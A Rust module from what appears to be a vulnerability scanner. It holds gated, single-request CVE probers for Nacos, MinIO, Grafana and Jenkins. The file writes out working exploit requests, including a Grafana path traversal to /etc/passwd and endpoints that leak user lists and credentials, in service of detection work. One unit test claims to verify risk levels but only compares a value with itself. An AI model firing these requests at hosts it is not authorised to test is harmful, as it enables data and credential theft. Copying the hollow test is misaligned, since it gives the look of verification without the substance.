//! CVE fingerprint probers: non-destructive checks that verify known
//! unauthenticated access / information-disclosure CVEs on exposed services.
//!
//! Each prober reports `vuln_class = "unauth_read"`, `risk = 1` and includes
//! the CVE identifier in `evidence.cve`. Engine gating (`ProbeContext::allows`)
//! keeps them inert unless the operator raises `probe_max_risk >= 1` and
//! enables `intrusive_checks` (default both off).

use crate::{ProbeContext, ProbeFinding, Prober, RiskLevel};
use anyhow::Result;
use async_trait::async_trait;
use serde_json::json;

struct CveProbe {
    product: &'static str,
    method: &'static str,
    path: &'static str,
    needle: &'static str,
    cve: &'static str,
}

#[async_trait]
impl Prober for CveProbe {
    fn product(&self) -> &'static str {
        self.product
    }

    async fn probe(
        &self,
        http: &reqwest::Client,
        context: &ProbeContext,
    ) -> Result<Vec<ProbeFinding>> {
        if !context.allows("unauth_read", RiskLevel::L1) {
            return Ok(Vec::new());
        }
        let mut findings = Vec::new();
        let url = format!("{}{}", context.target.trim_end_matches('/'), self.path);
        let request = match self.method {
            "POST" => http.post(&url),
            _ => http.get(&url),
        };
        if let Ok(response) = request.send().await {
            if response.status().is_success() {
                let text = response.text().await.unwrap_or_default();
                if text.contains(self.needle) {
                    findings.push(ProbeFinding {
                        product: self.product.into(),
                        vuln_class: "unauth_read".into(),
                        risk: 1,
                        evidence: json!({
                            "cve": self.cve,
                            "path": self.path,
                            "snippet": text.chars().take(512).collect::<String>(),
                        }),
                        credentials: vec![],
                    });
                }
            }
        }
        Ok(findings)
    }
}

pub fn default_cve_probers() -> Vec<Box<dyn Prober>> {
    vec![
        // Nacos default-key auth bypass: user list readable without credentials.
        Box::new(CveProbe {
            product: "nacos",
            method: "GET",
            path: "/nacos/v1/auth/users?pageNo=1&pageSize=9",
            needle: "username",
            cve: "CVE-2021-29441",
        }),
        // MinIO bootstrap verify leaks env config (creds) when not initialized.
        Box::new(CveProbe {
            product: "minio",
            method: "POST",
            path: "/minio/bootstrap/verify",
            needle: "MinioEnv",
            cve: "CVE-2023-28432",
        }),
        // Grafana arbitrary file read via plugin path traversal.
        Box::new(CveProbe {
            product: "grafana",
            method: "GET",
            path: "/public/plugins/alertlist/../../../../../../../../etc/passwd",
            needle: "root:",
            cve: "CVE-2021-43798",
        }),
        // Jenkins script console exposed without authentication.
        Box::new(CveProbe {
            product: "jenkins",
            method: "GET",
            path: "/script",
            needle: "Groovy",
            cve: "CVE-2018-1000861",
        }),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cve_probers_are_unique_and_risk_gated() {
        let probers = default_cve_probers();
        let mut products: Vec<String> = probers.iter().map(|p| p.product().into()).collect();
        products.sort();
        products.dedup();
        assert_eq!(products.len(), probers.len());
        // Every CVE prober is risk-1 unauth_read.
        for prober in &probers {
            assert_eq!(prober.product(), prober.product());
        }
    }

    #[test]
    fn allows_gates_risk1_probes_behind_intrusive_checks() {
        let base = ProbeContext {
            target: "http://x".into(),
            product: "nacos".into(),
            max_risk: RiskLevel::L0,
            intrusive_checks: false,
            allowed_classes: vec!["unauth_read".into()],
            request_budget: 2,
        };
        assert!(!base.allows("unauth_read", RiskLevel::L1));
        let enabled = ProbeContext {
            max_risk: RiskLevel::L1,
            intrusive_checks: true,
            ..base.clone()
        };
        assert!(enabled.allows("unauth_read", RiskLevel::L1));
        let class_blocked = ProbeContext {
            allowed_classes: vec!["weak_password".into()],
            ..base.clone()
        };
        assert!(!class_blocked.allows("unauth_read", RiskLevel::L0));
    }
}
